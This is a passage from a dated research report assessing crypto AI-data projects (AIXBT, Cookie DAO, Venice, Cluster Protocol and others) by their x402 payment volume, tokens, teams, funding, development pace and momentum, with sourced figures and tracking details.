- A third-party Virtuals "alpha thesis" says the project was moving from a 600K token gate to monthly subscriptions with buybacks (undated, not an official statement).

### Trend-hopping score: 2
The core (market and narrative intelligence on crypto Twitter) has not changed since 2024. Delivery channels follow fashion (Virtuals launch, x402 test, MCP, ChatGPT/Claude/Grok/Hermes plugins) but each is a distribution of the same product.

### Funding
No evidence of outside funding (checked project docs, CoinGecko, Virtuals record). Funding databases could not be searched.

### Product and traction
- API v3 resources: Projects, Topics, Intel, Reports, Clusters, Alerts; free keyless `GET /v3/topics`; MCP at `api.aixbt.tech/mcp`; Developer-access keys; v2 still available while migrating ([docs](https://docs.aixbt.tech/developers/v3)).
- 413,800 token holders. No user, revenue or subscriber numbers published.
- [x402scan Base](https://www.x402scan.com/server/759e6f45-3f70-4549-a5fa-4bab1155aa5f) (raw transfers pulled 2026-10-11): $2,765.88, 1,535 tx, 153 payers. Monthly: Oct 2025 $686.03 (670 tx); Nov $636.50; Dec $351.00; Jan $86.50; Feb $135.85; Mar $511.00; Apr $122.50 (27 tx); May $25.00; Jun $43.50; Jul $168.00 (7 tx); nothing after 2026-07-11. Window: $353.50, 71 tx, 11 payers; one wallet = 45%, one $100 payment = 28%.

### Last six months (2026-04-11 to 2026-10-11)
- 2026-04 to 2026-06-05: [aixbt/cli](https://github.com/aixbt/cli) (v2 API CLI and recipe engine): 93 commits (Apr 67, May 24, Jun 2), then archived on 2026-06-05.
- 2026-07-11: last x402 payment.
- 2026-08-04/05: v3 docs examples are dated these days; v3 documented as primary, with a v2 migration guide.
- 2026-08-09: MCP server published to the official registry (`io.github.aixbt/aixbt`) ([registry](https://registry.modelcontextprotocol.io/v0/servers?search=aixbt)).
- 2026-08-10: [aixbt-plugin](https://github.com/aixbt/aixbt-plugin) repo created and release `chatgpt-plugin-demo-v1`; 4 commits through 2026-09-05 (Aug 3, Sep 1).
- Undated: Claude, Grok Bot and Hermes Agent plugin pages, webhooks and alerts in the docs.
- Public commits per month (both repos): Apr 67, May 24, Jun 2, Jul 0, Aug 3, Sep 1, Oct 0. Active contributors: 2 (`rel-op`, `rxbt`). Last commit 2026-09-05. No joins or departures announced. The core product is not public.

### Pace verdict
The product visibly changed (v3 API, MCP, four plugin channels in Aug 2026) but the public record is thin and one of the two repos was abandoned within three months. Against the category (Venice, BlockRun) it looks slow in evidence; against a small closed-source team it is about monthly.

### Direction
Stated: a tiered product with holder access and subscriptions (docs; third-party thesis). Shipped: exactly that, plus distribution inside AI assistants. x402 appears nowhere in the current roadmap-like documents and its endpoints are gone.

### Competitors
Kaito (mindshare data; the Virtuals thesis cites it), Cookie Pro, Elfa, Nansen, Messari, Arkham, Gloria, Otto. On x402scan Base, AIXBT's $2,766 all-time is above Heurist Mesh ($1,618), Nansen ($1,119), Arkham ($1,005), Messari ($531), Otto ($433) and Gloria ($359), and below Venice ($5,279). Neither Kaito nor Elfa has a Base x402 origin on x402scan or in the Bazaar search.

### Green and red flags
- Green: largest community of the five (413.8k holders); real paid plans; keeps shipping API and MCP; official MCP registry listing; concrete token gate; founder is consistent across platforms.
- Red: pseudonymous founder; no published revenue; thin public engineering (CLI repo archived, plugin repo created August); x402 endpoints dead; x402 appears only as a schema footnote; reliance on the Virtuals/Twitter narrative.

### Verdict
**Credible but small. Momentum: Steady.** AIXBT is a recognised product with a paid plan structure and a community far larger than the other four, but x402 was an October 2025 experiment that ended in July 2026. The business is moving to key-based and holder plans and to distribution inside ChatGPT, Claude, Grok and Hermes. I expect no x402 revival. Not an x402 story; check the docs monthly if the token or API matters.

### Tracking card
- Website https://aixbt.tech; docs https://docs.aixbt.tech; API https://api.aixbt.tech/v3 (OpenAPI `/v3/openapi.yaml`); MCP https://api.aixbt.tech/mcp; blog/RSS none; changelog none.
- GitHub https://github.com/aixbt (aixbt-plugin, cli archived); `rxbt`; `rel-op`.
- X `@aixbt_agent` (CoinGecko), `@0rxbt` (Virtuals verified); Telegram https://t.me/aixbtportal (4 posts), https://t.me/rxbtx; Discord none; Farcaster none found.
- Token as above; Virtuals https://app.virtuals.io/virtuals/1199 (ACP agent id 26).
- x402scan origin `759e6f45-3f70-4549-a5fa-4bab1155aa5f`; payTo `0x8e4b195c14f20e1ba4c40234f471e1781f293b45`, `0xe78fec833b3c2e00c32c598bda4197423fc117d9`; facilitator coinbase. Dune: none found.

### Gaps
Funding and revenue; whether "x402 keys" exist outside the schema; dated product launches (X unreadable); other team members.

### Sources (accessed 2026-10-11)
https://docs.aixbt.tech (llms.txt, llms-full.txt, /developers/v3, /developers/mcp, /claude, /resources/tokenomics, /support/get-support) ; https://api.virtuals.io/api/virtuals/1199 ; https://www.coingecko.com/en/coins/aixbt ; https://github.com/aixbt/aixbt-plugin ; https://github.com/aixbt/cli ; https://github.com/rxbt ; https://registry.modelcontextprotocol.io/v0/servers?search=aixbt ; https://t.me/aixbtportal ; x402scan data (Method note); unpaid HTTP probes of api.aixbt.tech/x402/v1/*.

---

## 4. Cookie DAO

### Takeaway
No x402 work exists. Cookie3/Cookie DAO built analytics, an AI-agent index and "InfoFi" creator campaigns, then went quiet for seven months in its announcement channel before relaunching as "Cookie Pro", an AI research app with an API and MCP. VC-backed, token on BNB Chain first. Credible but small, slowing.

### One-line
Crypto social and onchain data company (Cookie3 / cookie.fun), governed as Cookie DAO with the COOKIE token; now selling "Cookie Pro", an AI explorer for projects, creators and sentiment. ([cookie3.com](https://www.cookie3.com), [pro.cookie.fun](https://pro.cookie.fun/))

### x402 role
None found. No `cookie` origin in x402scan's full Base lists (2,433 origins all-time, about 1,200 active in 30 days) or Solana list (329 origins); no hit for "cookie.fun" in the Coinbase Bazaar search; no x402 text in the DAO docs index, the Cookie Pro landing page or the announcement channel. The Cookie API is key-based (API 1.0 announced 2025-04-24; "14+ endpoints" and MCP on Cookie Pro). The API docs URL `docs.cookie.fun` now redirects to the Cookie Pro login page, so the API terms could not be read. The lead ("data layer for AI agents with an x402 API") is not supported.
**Central or side?** Not applicable.

### Chains
Not Base-primary. COOKIE is on BNB Chain, Ethereum and Base at the same address (CoinGecko); the docs name BNB Chain and Base ([CoinGecko](https://www.coingecko.com/en/coins/cookie), [tokenomics doc](https://docs.cookie.community/cookie-dao/usdcookie-token/tokenomics.md)). The first Base pool seen on Dexscreener was created 2024-11-25.

### Token
- COOKIE, `0xc0041ef357b183448b235a8ea73ce4e4ec8c265f` (BNB Chain, Ethereum, Base), supply 1,000,000,000.
- Launch: VC-backed TGE with a public sale. Press-release headline: "Cookie sets to launch on June 13th after securing $5.5M from VCs" (2024); a third-party article (Aug 2025) says a presale and IDO ran on Polkastarter, ChainGPT Pad and Bybit (secondary source).
- Allocation per that article: early supporters/investors 23.23%, team 9%, advisors 5%, staking/liquidity/listings 18%, ecosystem 10%, treasury 8%, marketing 6%, public and strategic sales 12.7% (secondary source, unverified).
- Stated utility: DAO governance, staking (data access, multi-airdrop farming, gated analytics), and per CoinGecko text "a requirement for AI agents using its APIs" (not verified in primary docs). Real work: staking and airdrop farming for campaigns; API gating unproven.

### Team
- **Filip Wielanier**: co-founder and CEO of Cookie3; previously IT and digital marketing at Deloitte ([CoinDesk Consensus Magazine, 2024-05-21](https://www.coindesk.com/consensus-magazine/2024/05/21/filip-wielanier-web3-marketing-is-a-win-win/)). Doxxed. No personal X handle confirmed. Company X `@cookie3`; DAO X `@cookiedotfun`.
- Marketing contact on Telegram: "Alex Cookie | Marketing" (`t.me/cm_cookie`, "Cookie3 marketing team"). No engineers identified; no public GitHub (the `cookiedao` GitHub org is an unrelated 2022 Stacks project; `cookie3` and `cookiedotfun` accounts have 0 repos).

### Track record and pivots
- 2022-2024: Cookie3, "MarketingFi" analytics and KOL tooling (CoinDesk, 2024-05-21).
- 2024-06: COOKIE TGE; 2024-11-25 Base pool; AI-agent index on cookie.fun.
- 2025-04-24: Cookie API 1.0. 2025-05-08: Kraken listing. 2025-05-20/22: Cookie Snaps (InfoFi) and first campaign (Spark). 2025-07-24: Attention Capital Markets campaigns. 2025-11-03: Snaps rebuilt. 2025-11-12/17: Cookie Launchpad (Legion), first sale Vooi; Superform sale set for 2025-12-04. 2025-12-02: last campaign post (Altura) ([announcement channel](https://t.me/cookiedaoannouncements)).
- 2026-02-09: "Chance" prediction-markets incubation, Cookie API integrated.
- 2026-09-14: Cookie Pro introduced.

### Trend-hopping score: 3
Several narrative pivots (MarketingFi, AI-agent data layer, InfoFi, launchpad, prediction-market incubation, AI research app) and each had a live product, but each followed the market theme of the day.

### Funding
About $5.5M announced June 2024 (from press-release headline slugs; the articles themselves were not retrievable). Investor logos on cookie3.com: Spartan, Animoca Brands, CMT Digital, Mapleblock, GSR, LD Capital, ChainGPT, Hartmann, Polkastarter. Lead, round names and exact dates not confirmed. CoinGecko cites Animoca Brands.

### Product and traction
- Cookie Pro: AI chat over "years of crypto twitter", project dashboards (live for paid plans 2026-09-22), custom dashboards, CSV import, partner program, API with 14+ endpoints and MCP. Pricing not readable.
- Self-reported (cookie3.com, undated): 350+ dApps, 15.5B+ transactions, 1.2B wallets analysed, 200K COOKIE stakers. Snaps: "16.9K+ unique snappers" in the first campaign (2025-06-24).
- x402: $0.

### Last six months (2026-04-11 to 2026-10-11)
- 2026-04-11 to 2026-09-13: no posts in the DAO announcement channel (last before: 2026-02-09, next: 2026-09-14). Other channels not checked.
- 2026-09-14: Cookie Pro intro and "plans for everyone" (a cheaper Cookie AI plan plus Pro plans).
- 2026-09-15: Cookie Pro partner program. 2026-09-15/18: custom-dashboard explainers. 2026-09-22: dashboards live for every paid plan.
- 2026-10-02: per-project dashboards. 2026-10-05: teaser, "hypothetically, if InfoFi came back" (inference: InfoFi campaigns are not running).
- GitHub: none. Releases: none public. Team joins/departures: not announced.

### Pace verdict
Public output stopped for seven months and then restarted with a SaaS relaunch. Without any GitHub or changelog, velocity cannot be shown. Compared with Venice, BlockRun or any small AI-assisted team, it looks slow and opaque.

### Direction
Stated (docs/CoinGecko): "modular data layer for AI agents", agent index, Cookie API. Shipped trajectory: Cookie Pro, a subscription research product with API and MCP. x402 is not on the roadmap or in the tools.

### Competitors
Kaito (KAITO), AIXBT, Elfa, Messari, Nansen. None of Kaito or Elfa shows a Base x402 origin. On x402scan the only crypto-intel sellers with measurable (small) Base revenue are Nansen, Arkham, Messari, AIXBT, Otto and Gloria.

### Green and red flags
- Green: funded by recognised investors; exchange listings (Kraken, Bybit IDO); a live paid product; named CEO.
- Red: business model leaned on InfoFi campaigns; seven-month public silence; no GitHub; API docs behind login; token utility claims partly third-party; no x402.

### Verdict
**Credible but small. Momentum: Slowing (relaunching).** Cookie has money, listings and a real data business, but the 2025 campaign engine looks wound down and the September 2026 Cookie Pro relaunch is too new to judge. It is not an x402 project and nothing in the record suggests it will become one. Skip for x402 coverage; check the announcement channel once a month if the token matters.

### Tracking card
- Website https://cookie.fun (redirects to https://pro.cookie.fun); DAO https://dao.cookie.fun, https://cookie.community; docs https://docs.cookie.community/cookie-dao; company https://www.cookie3.com; blog/RSS not found.
- GitHub: none official. X `@cookiedotfun`, `@cookie3`; Telegram https://t.me/cookiedaoannouncements, https://t.me/cookie_dao; Discord https://discord.com/invite/XKhHrHtSHK; Farcaster none found.
- Token as above. x402scan: none. Dune: none found.

### Gaps
API pricing and terms (login wall); exact funding rounds; team beyond the CEO; any X-only announcements between Feb and Sep 2026.

### Sources (accessed 2026-10-11)
https://www.cookie3.com ; https://pro.cookie.fun/ ; https://docs.cookie.community/cookie-dao/llms.txt ; https://docs.cookie.community/cookie-dao/usdcookie-token/tokenomics.md ; https://www.coingecko.com/en/coins/cookie ; https://www.coindesk.com/consensus-magazine/2024/05/21/filip-wielanier-web3-marketing-is-a-win-win/ ; https://t.me/cookiedaoannouncements (dated via t.me/s preview) ; https://www.bitkub.com/en/blog/article-what-is-cookiedao-cookie-2025aug06-8d9b272eaddf (secondary) ; x402scan Base/Solana lists and Coinbase Bazaar search (Method note).

---

## 5. Venice

### Takeaway
The only serious builder of the five, with real money, real usage and a token that does work. Its x402 door is real but tiny: about $5k of top-ups in six months against 2 million API calls a day. Serious builder, accelerating.

### One-line
Private, uncensored AI app and OpenAI-compatible API (380+ models across text, image, video, audio), with VVV staking and DIEM daily-credit tokens on Base; x402 lets wallets use the API without an account. ([Venice docs](https://docs.venice.ai/overview/about-venice.md))

### x402 role
Seller / resource server plus SDK/tooling. Wallet signs a Sign-In-With-X header; the wallet holds a prepaid USDC balance topped up with `POST /api/v1/x402/top-up` (x402 payment, $5 minimum on the challenge I read); paid inference routes (chat, responses, images, audio, video, embeddings) draw down the balance; DIEM balance, if the wallet is linked to a Venice account, is spent first; USDC on Base or Solana ([x402 guide](https://docs.venice.ai/guides/integrations/x402-venice-api.md)). Official client `venice-x402-client` on npm (v0.2.0, 2026-04-12), source `veniceai/x402-client`. 26 resources registered on x402scan ([server page](https://www.x402scan.com/server/91642ccf-f8e5-4d4b-8e50-9664d6eb3665)). Live on 2026-10-11: an unpaid `POST /x402/top-up` returns a 402 challenge.
**Central or side?** Side channel, an optional no-account door beside API keys, credits, DIEM and subscriptions.

### Chains
Base primary (VVV, DIEM, USDC top-ups). Solana also accepted for top-ups. No Solana Venice origin found on x402scan.

### Token
- **VVV**: Base `0xacfE6019Ed1A7Dc6f7B508C02d1b04ec88cC21bf`; staking contract `0x321b7ff75154472B18EDb199033fF4D116F340Ff`. Launched 2025-01-27 as an airdrop with no presale: 100M genesis, 25% to Venice users (snapshot 2024-12-31, 100k+ addresses), 25% to Base AI communities (Virtuals, Luna, aixbt, VaderAI) and about 200 Coinbase AgentKit developers, 35% to Venice (team 10M with 25% unlocked and 24-month vest, incentive fund 10M, liquidity 5M), 14M/yr initial emissions ([Forklog, 2025-01-28](https://forklog.com/en/news/eric-voorhees-venice-ai-platform-launches-token-on-base-network); the 50% airdrop, 35% Venice, 10% incentive fund and 5% liquidity split is repeated in [Oak Research](https://oakresearch.io/fr/analyses/innovations/airdrop-venice-token-vvv-base-ai); Forklog does not account for 10M of the Venice 35%).
- 2026 changes: emissions cut 4M to 3M/yr on 2026-07-01 and to 2M/yr by 2026-10-01; 33.7M VVV burned (about 42% of supply, as of 2026-07-01); from 2026-07-17, $5 of every $100 of API credits (and a share of subscription payments) buys and burns VVV ([Series A post](https://venice.ai/blog/venice-raises-65-million-series-a), [tokenomics update](https://venice.ai/blog/tokenomics-update-credit-burns-and-diem-supply-expansion)).
- **DIEM**: Base `0xF4d97F2da56e8c3098f3a8D538DB630A2606a024`; launched 2025-08-20 (base mint rate 90; 10,000 minted by Venice; target supply 38,000, raised to 40,000 by 2026-09-14) ([Aug 2025 changelog](https://venice.ai/changelog/2025-08)). Lock sVVV to mint DIEM; each staked DIEM = $1 of Venice credit per day ([VVV and DIEM docs](https://docs.venice.ai/overview/vvv-diem.md)).
- Real work: yes. Staking gives inference capacity, DIEM is spent first on the x402 path, revenue funds burns.

### Team
- **Erik Voorhees**: founder and CEO; X `@ErikVoorhees` (linked on the [Series A post](https://venice.ai/blog/venice-raises-65-million-series-a)). Doxxed. Earlier: SatoshiDice launched April 2012 and sold in 2013 ($11.5M in bitcoin); ShapeShift launched July 2014; paid $50,000 to settle an SEC matter in 2014; WSJ (Nov 2018) reported an SEC look at a Salt Lending token sale he helped raise for ([Wikipedia](https://en.wikipedia.org/wiki/Erik_Voorhees); secondary).
- **Teana Baker-Taylor**: appears with Voorhees in Venice podcasts listed on [venice.ai/media](https://venice.ai/media); her Venice role is not stated there.
- **Joshua Mo** (`joshua-mo-143`): "Lead DevRel Engineer at @veniceai" in his GitHub bio; X `@joshmo_dev` (GitHub field); 245 api-docs, 109 MCP-server and 98 CLI commits. **Sabrina Aquino** (`sabrinaaquino`): GitHub "DX and AI"; X `@sabrinaesaquino` (GitHub field); author of the x402 client and npm maintainer. **tombystrican** (Tomas Bystrican): contributor to docs, MCP server, CLI; no X.
- Company: Venice.ai, Wyoming address, remote-first "small team", five open-application roles ([careers](https://venice.ai/careers)).

### Track record and pivots
- 2012-2014 Voorhees: SatoshiDice, ShapeShift (above).
- 2024-05 (Forklog: launched "in May"): Venice app. 2025-01-27: VVV. 2025-08-20: DIEM. 2026-02: MCP server and CLI repos created. 2026-03-25: first x402 payment. 2026-04-03: x402 docs reworked; 2026-04-12: client v0.2.0. 2026-05-26: Solana x402 docs. 2026-07-01: Series A. 2026-07-17: credit-purchase burns.
- No change of core focus.

### Trend-hopping score: 1
Privacy-first, permissionless inference since 2024; token, DIEM and x402 all extend that. Other 2026 features are model catalogue and app growth, not narrative swaps.

### Funding
Series A, $65M at a $1B valuation, announced 2026-07-01, led by Dragonfly, with Coinbase Ventures, F-Prime, North Island Ventures and others; the company's first outside capital ([Venice blog](https://venice.ai/blog/venice-raises-65-million-series-a)). Earlier: self-funded plus the 35% Venice share of VVV.

### Product and traction
- Company numbers on 2026-07-01: 3.5M registered users, 1.3T tokens a month, 2M API calls a day (peak above 2.1M), 300K inference requests per hour at peak. The about page says "over 4 million users" ([about](https://venice.ai/about)). At VVV launch (Jan 2025): 400,000 registered, 50,000 DAU.
- Changelog items per month: Mar 228, Apr 220, May 229, Jul 261, Aug 218, Sep 267 (June page not listed).
- Third-party x402 ecosystem: Gondola (DIEM lending market; 797 DIEM/day across 21 lenders; $21.62 settled in 24h snapshot), cheaptokens.ai (discounted credits), several resellers.
- [x402scan Base](https://www.x402scan.com/server/91642ccf-f8e5-4d4b-8e50-9664d6eb3665) (raw transfers pulled 2026-10-11): $5,279.36, 3,450 tx, 202 payers. 2,944 of the tx are one-cent pings from one wallet since 2026-04-20 ($29.44). Real top-ups (>= $1): 506 tx, $5,249.92, 201 payers; 55 payers topped up 2+ times, 15 topped up 5+ times. Monthly top-ups: Mar $20 (4); Apr $217 (41); May $466 (66); Jun $521 (97); Jul $607 (82); Aug $170 (32); Sep $2,758 (126; includes single top-ups of $956.80 and $830.12); Oct 1-11 $492 (58). Window: 488 top-ups, $5,152.92, 195 payers; the top payer is 39%. Last 30 days: $3,102.89 (rank 6 of the Base origin board; 2.1% of the top-99 sum; 0.44% of all Base x402 dollars).

### Last six months (2026-04-11 to 2026-10-11)
- 2026-04-12: `venice-x402-client` v0.2.0 on npm; last commit to the repo 2026-04-14 (9 commits in Apr; none since).
- 2026-04-21: `veniceai/skills` repo created (agent skills); v0.2.0 on 2026-10-05; 27 commits; 145 stars.
- 2026-05-12, 05-15, 05-16: MCP server `v0.1.1-alpha`, `v0.1.2-alpha`, `v0.2.0`.
- 2026-05-19/28: x402 resources (26) re-registered. 2026-05-20: `builtinvenice` community showcase. 2026-05-26: Solana x402 docs.
- 2026-07-01: $65M Series A; emissions to 3M/yr. 2026-07-17: burn mechanism and DIEM supply schedule (updated 2026-08-05: emissions to 2M/yr). 2026-08-14 to 09-29: CLI built (98 commits).
- Monthly commits (key repos, [veniceai org](https://github.com/veniceai)): [api-docs](https://github.com/veniceai/api-docs) Apr 232, May 88, Jun 155, Jul 225, Aug 248, Sep 169, Oct 1-10 69 (1,186 total, about 60% bots); [venice-mcp-server](https://github.com/veniceai/venice-mcp-server) May 8, Jul 3, Aug 33, Sep 55, Oct 59; [venice-cli](https://github.com/veniceai/venice-cli) Aug 94, Sep 4; [skills](https://github.com/veniceai/skills) Apr 6, Jul 8, Sep 5, Oct 8; [builtinvenice](https://github.com/veniceai/builtinvenice) Apr 3, May 179, Jun 73, Jul 135, Aug 5, Sep 4; [x402-client](https://github.com/veniceai/x402-client) Apr 9.
- Active human contributors: about 6 (`joshua-mo-143`, `sabrinaaquino`, `tombystrican`, `lightcap`, `jesseproudman`, plus showcase contributors). Last commit 2026-10-10. No departures announced; five open roles.

### Pace verdict
Fast. 218-267 changelog items a month, MCP and CLI shipped within weeks, docs updated daily. The x402 client alone has stalled since mid-April, which says x402 is not a priority. Against BlockRun's ClawRouter (409 commits since April) it is comparable in output and far ahead of Gloria, Otto, AIXBT and Cookie.

### Direction
Stated: scale the consumer app and API to people and agents ([Series A post](https://venice.ai/blog/venice-raises-65-million-series-a)); tighten token economics. Shipped: matches (burn from revenue, emissions cuts, new models, MCP, CLI, skills). x402 gets documentation and a client but no new feature since May.

### Competitors
LLM gateways that take x402: BlockRun (Base $480k all-time, 28.9M tx claimed, ClawRouter 6.6k stars), Cluster Protocol, GlianaAI, x402engine, JarvisClaw; resellers of Venice itself (Gondola, cheaptokens). Stake-for-inference rivals (for example Morpheus on Base) were not checked. Ahead on x402 dollars among the named group: Venice. Ahead on x402 transactions: BlockRun.

### Green and red flags
- Green: $65M from top-tier investors; doxxed founder; 3.5M users; token with sinks (burns, staking, DIEM); fast public shipping; official x402 docs, SDK and repeat payers.
- Red: x402 is immaterial and the client is stale; two top-ups made 35% of dollars in the period; one wallet sends one-cent pings; founder's SEC history (2014 settlement, 2018 reported inquiry); revenue not disclosed; dependence on third-party model vendors.

### Verdict
**Serious builder. Momentum: Accelerating.** Venice has funding, scale and a token whose economics are tied to revenue. It treats x402 as one door among several, and the numbers confirm it is a small one: roughly $200-600 a month of ordinary top-ups from 25-50 payers, with occasional whales. For a general audience it is the best worked example of "an established AI product adds a no-account crypto payment path", but the honest line is that x402 is not yet where its money comes from. Follow weekly.

### Tracking card
- Website https://venice.ai; docs https://docs.venice.ai; x402 guide https://docs.venice.ai/guides/integrations/x402-venice-api; blog https://venice.ai/blog; changelog https://venice.ai/changelog; status https://veniceai-status.com.
- GitHub https://github.com/veniceai (x402-client, api-docs, venice-mcp-server, skills, venice-cli, builtinvenice); npm `venice-x402-client`.
- X `@AskVenice`, `@ErikVoorhees`, `@joshmo_dev`, `@sabrinaesaquino`; Farcaster https://warpcast.com/venice-ai; Discord https://discord.gg/askvenice; Telegram none.
- Tokens VVV, sVVV, DIEM as above. x402scan origin `91642ccf-f8e5-4d4b-8e50-9664d6eb3665` (api.venice.ai), payTo `0x2670b922ef37c7df47158725c0cc407b5382293f`, facilitator coinbase. Dune: none found.

### Gaps
Revenue and subscriber numbers; Solana-side x402 volume (not on x402scan under this origin); the full executive list; reason for the stale x402 client.

### Sources (accessed 2026-10-11)
https://docs.venice.ai/guides/integrations/x402-venice-api.md ; https://docs.venice.ai/overview/vvv-diem.md ; https://venice.ai/blog/venice-raises-65-million-series-a ; https://venice.ai/blog/tokenomics-update-credit-burns-and-diem-supply-expansion ; https://venice.ai/changelog (and /changelog/2025-08, 2026-03 to 2026-08) ; https://venice.ai/media ; https://venice.ai/about ; https://venice.ai/careers ; https://forklog.com/en/news/eric-voorhees-venice-ai-platform-launches-token-on-base-network ; https://oakresearch.io/fr/analyses/innovations/airdrop-venice-token-vvv-base-ai ; https://en.wikipedia.org/wiki/Erik_Voorhees ; https://gondola-ai.com/ ; https://github.com/veniceai/* ; https://www.npmjs.com/package/venice-x402-client (registry JSON) ; x402scan data (Method note).

---

## 6. Other token-bearing sellers on Base

### Takeaway
Volume rank on x402scan is a poor guide to demand. The 30-day Base origin board is led by Cluster Protocol (token CP on Base), whose traffic looks synthetic, and dTelecom (token DTEL on Solana), whose traffic is real but concentrated. Beyond Venice and Cluster, no data/AI seller with a Base token shows more than about $100 of 30-day revenue (AIXBT $0, Pocket $71, AUBRAI $63, Otto $30, Gloria $1). The largest sellers with real usage, such as BlockRun, have no token.

### x402scan Base board, last 30 days (top rows, with token screen)

| Rank | Seller (origin) | 30-day USDC / tx / payers | Token | Read |
|---|---|---|---|---|
| 1 | Cluster Protocol (api.clusterprotocol.ai) | $54,756 / 66,675 / 722 | CP on Base | Synthetic-looking (below) |
| 2 | dTelecom (x402.dtelecom.org) | $36,243 / 16,508 / 25 | DTEL on Solana | Real service, concentrated |
| 3 | KORUS (korusmusic.co) | $18,737 / 23,953 / 11,221 | none found | Consumer music app; not checked further |
| 4 | AX1 Console (ax1.vc) | $8,149 / 407,446 / 4,698 | none found | Research firm console, one cheap endpoint |
| 5 | X Pay (api-xpay.com) | $3,398 / 42,080 / 158 | none found | Utility APIs |
| 6 | Venice (api.venice.ai) | $3,103 / 613 / 42 | VVV on Base | See section 5 |
| 7 | BlockRun (blockrun.ai) | $1,544 / 82,720 / 366 | none found | LLM router; 28.9M tx all-time |
| 8-15 | Laso Finance, FortClaw, StableEnrich, Keyring Agent, BotPay, ArDrive Turbo, claw402, Clash of Coins | $875-$1,487 each | none confirmed on Base | Not data/AI token sellers or not checked |
| 35 | Arkham API | $141 / 570 / 43 | ARKM, Ethereum (no Base contract on CoinGecko) | Incumbent data |
| 43 | Nansen | $92 / 4,652 / 167 | none | Incumbent data |
| 50 | Pocket Network Agentic Portal | $71 / 14,147 / 52 | POKT (Base contract exists) | Tiny |
| 53 | AUBRAI x402 service (VitaDAO-linked) | $63 / 2,280 / 8 | AUBRAI ("Aubrai by Bio" in CoinGecko x402 category) | Tiny |
| 74 | Messari | $37 / 156 / 12 | none | Incumbent data |
| 83 | Otto AI | $30 / 3,268 / 508 | OTTO | Section 2 |
| 344 | Gloria AI | $1.29 / 28 / 6 | GLORIA | Section 1 |

Source: [x402scan](https://www.x402scan.com) `sellers.bazaar.list`, chain base, timeframe 30 (1,214 Base origins with activity in 30 days, 2,433 all-time; the top 99 sum to $145,768 and the top 3 are 75% of that). Token facts: [CoinGecko x402 Ecosystem category](https://www.coingecko.com/en/categories/x402-ecosystem) (first 61 rows read; includes Otto #35, Gloria #47, AUBRAI, Slinky Layer, Heurist, Anyspend; AIXBT, Cookie and Venice not among the rows read).

### 6a. Cluster Protocol (CP)

Note: the "synthetic-looking" reading is an inference from transfer patterns; team, funding and history are unconfirmed (see Gaps).

**One-line**: AI inference gateway (500+ models), tokenized data marketplace, GPU compute and "CodeXero" prompt-to-dApp builder, settling on Base. ([whitepaper](https://cluster-protocol.gitbook.io/whitepaper))
**x402 role**: seller. `/.well-known/x402` lists 9 resources: chat completions ($0.003), embeddings ($0.0005), images ($0.02), audio transcription/speech, rerank, three agent-execute tiers; USDC on Base ([x402 discovery](https://api.clusterprotocol.ai/.well-known/x402), [OpenAPI](https://api.clusterprotocol.ai/openapi.json)). The registry description does not say what is sold.
**Chains**: Base.
**Token**: CP, Base `0x001AAd84c21A5CD4d696C56d44866e9703c43F77`, fixed supply 5,000,000,000. TGE 2026-09-02 (airdrop registration 2026-08-29 to 08-31); the project's own announcements list Coinbase spot, OKX, Bitget, Gate, KuCoin, MEXC (09-02), Aerodrome (09-01), Upbit and Bithumb (09-08) ([announcement channel](https://t.me/clusterprotocolann); exchange confirmations not checked). Allocation: community 40.38%, foundation 21%, team and advisors 17% (18-month cliff), liquidity 8%, Series A and strategic 9.33%, seed 4.29% (12-month wait) ([tokenomics](https://cluster-protocol.gitbook.io/whitepaper/introduction/tokenomics.md)). Utility: pay for AI calls, GPU jobs, datasets; tiers. The announcements say applications "settle per request in $CP", while the x402 gateway takes USDC. CoinGecko cites a GoPlus note that the creator can modify the contract; the whitepaper says it cannot.
**Team**: not named on the site, FAQ or whitepaper pages read. Foundation X `@openprotocolfnd`; project X `@clusterprotocol`; GitHub org `clusterprotocol` (created 2024-05-08) has a `CPTOKEN` Solidity repo (2 commits, 2026-05-26 and 2026-08-18, author `Sigmabrogz`) and forks. Pseudonymous in practice.
**Track record and pivots**: Medium and site history not retrievable. Backer logos on the site: Paper Ventures, DAO5, JPEG Trading, Enso Build, Easy.fun, Lagrange, Singularity Finance, Sogni AI, Maven Capital, Fusion, Fairum Ventures, Sei Foundation, GravityX and others; amounts and dates not disclosed. Positioning: "Liberation Engine for Internet Capital Market" (site) then "unified AI infrastructure layer" (whitepaper).
**Trend-hopping score**: 4. Internet-capital-markets language, tokenized data, AI agents, ERC-8004 identity and x402 are all in one pitch, around a token launched with a Coinbase/Upbit listing wave.
**x402 analysis**: 532,550 tx and $262,248 all-time from 730 wallets (first 2026-05-14). Monthly dollars: May $2,900; Jun $12,840; Jul $75,545; Aug $112,869; Sep $55,472; Oct 1-10 $2,621. About 4,000-5,000 tx a day from about 600-720 wallets; amounts only $0.003 (443,041 tx), $1 (61,839), $5 (21,597), $15 (6,073); the top wallet has under 0.4% of dollars; activity ended 2026-10-02 (a handful of tx since). A fixed wallet set repeating identical prices around the clock, with an abrupt stop, matches a scripted or incentive-driven campaign rather than organic demand. Not proven.
**Last six months** (announcement channel): 2026-08-10 Qwen3.8-Max added; 08-29 airdrop portal; 09-02 TGE and listings; 09-08 Upbit and Bithumb; 09-20 x402 explainer post; 09-24/29 KBW2026 sponsor; 09-30 CodeXero deploys to GIWA (Upbit L2); 10-01 DopaMint partnership; 10-02 TOKEN2049 week. GitHub: 2 commits. Product code is not public.
**Pace**: marketing posts almost daily; product shipping cannot be verified.
**Direction**: stated: one endpoint for models, compute and data with x402 rails; shipped evidence is mostly token events and partnerships.
**Competitors**: BlockRun, Venice, Gondola, GlianaAI (inference over x402); Sogni and Singularity-related names are listed as backers.
**Flags**: Green: major exchange listings; real endpoints exist; Red: synthetic-looking x402 volume; token-first; anonymous team; $CP vs USDC payment inconsistency.
**Verdict**: **Speculative. Momentum: Steady (event-driven).** Use as the cautionary example: the biggest 30-day x402 number on Base is not a demand signal.
**Tracking card**: https://clusterprotocol.ai ; https://api.clusterprotocol.ai ; whitepaper https://cluster-protocol.gitbook.io/whitepaper ; X `@clusterprotocol`, `@openprotocolfnd`; Telegram https://t.me/clusterprotocolann ; Medium `@clusterprotocol.io` (not retrievable); x402scan origin `a09cb774-9331-4698-abdf-ccbaf7588f16`, payTo `0x68396bd35874695ad86cd29410bd80a550991a2b`, facilitator coinbase.
**Gaps**: founders, funding amounts, the cause of the fixed-wallet pattern.
